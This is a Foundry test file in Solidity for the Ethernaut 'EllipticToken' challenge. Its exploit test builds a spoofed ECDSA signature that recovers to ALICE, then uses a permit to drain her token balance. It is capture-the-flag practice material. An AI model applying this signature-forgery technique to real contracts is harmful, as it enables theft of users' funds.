// SPDX-License-Identifier: MIT
pragma solidity =0.8.28;

import "forge-std/Test.sol";
import {EllipticToken} from "../../src/ethernaut2025/EllipticToken.sol";

contract EllipticTokenTest is Test {
    EllipticToken token;
    address ALICE = 0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e;
    address BOB = 0xB0B14927389CB009E0aabedC271AC29320156Eb8;
    uint256 INITIAL_AMOUNT = 10 ether;

    function setUp() public {
        token = new EllipticToken();
        token.transferOwnership(BOB);

        bytes memory bobSignature =
            hex"085a4f70d03930425d3d92b19b9d4e37672a9224ee2cd68381a9854bb3673ef86b35cfdeee0fb1d2168587fb188eefb4fe046109af063bf85d9d3d6859ceb4451c";
        bytes memory aliceSignature =
            hex"ab1dcd2a2a1c697715a62eb6522b7999d04aa952ffa2619988737ee675d9494f2b50ecce40040bcb29b5a8ca1da875968085f22b7c0a50f29a4851396251de121c";
        bytes32 salt = keccak256("BOB and ALICE are part of the secret sauce");
        token.redeemVoucher(INITIAL_AMOUNT, ALICE, salt, bobSignature, aliceSignature);
    }

    function testEllipticTokenExploit() public {
        (address player, uint256 playerKey) = makeAddrAndKey("Player");

        // Spoofed signature (from the official solution) that recovers ALICE
        // for the hash bytes32(amount).
        bytes32 r = 0xd3433fe216c991674d4c7e2186460a412b91c976c44569433a0985dffc099b02;
        bytes32 s = 0x16417451991575e0cdfc4aaff865deb0843abf95f606aed775fda4e40e047e14;
        uint8 v = 27;
        uint256 amount = uint256(0x59e540931475e32e9ace9d434a5667767f569cd3c8316ea28398398bac06df55);
        bytes memory aliceSpoofedSignature = abi.encodePacked(r, s, v);

        bytes32 permitAcceptHash = keccak256(abi.encodePacked(ALICE, player, amount));
        (v, r, s) = vm.sign(playerKey, permitAcceptHash);
        bytes memory playerPermitAcceptanceSignature = abi.encodePacked(r, s, v);

        vm.prank(player);
        token.permit(amount, player, aliceSpoofedSignature, playerPermitAcceptanceSignature);

        vm.prank(player);
        token.transferFrom(ALICE, player, INITIAL_AMOUNT);

        assertEq(token.balanceOf(ALICE), 0);
    }
}

contract EllipticTokenControlTest is Test {
    function testAliceStartsFunded() public {
        EllipticToken token = new EllipticToken();
        token.transferOwnership(0xB0B14927389CB009E0aabedC271AC29320156Eb8);
        bytes memory bobSignature =
            hex"085a4f70d03930425d3d92b19b9d4e37672a9224ee2cd68381a9854bb3673ef86b35cfdeee0fb1d2168587fb188eefb4fe046109af063bf85d9d3d6859ceb4451c";
        bytes memory aliceSignature =
            hex"ab1dcd2a2a1c697715a62eb6522b7999d04aa952ffa2619988737ee675d9494f2b50ecce40040bcb29b5a8ca1da875968085f22b7c0a50f29a4851396251de121c";
        bytes32 salt = keccak256("BOB and ALICE are part of the secret sauce");
        token.redeemVoucher(10 ether, 0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e, salt, bobSignature, aliceSignature);
        assertEq(token.balanceOf(0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e), 10 ether);
    }
}

// end

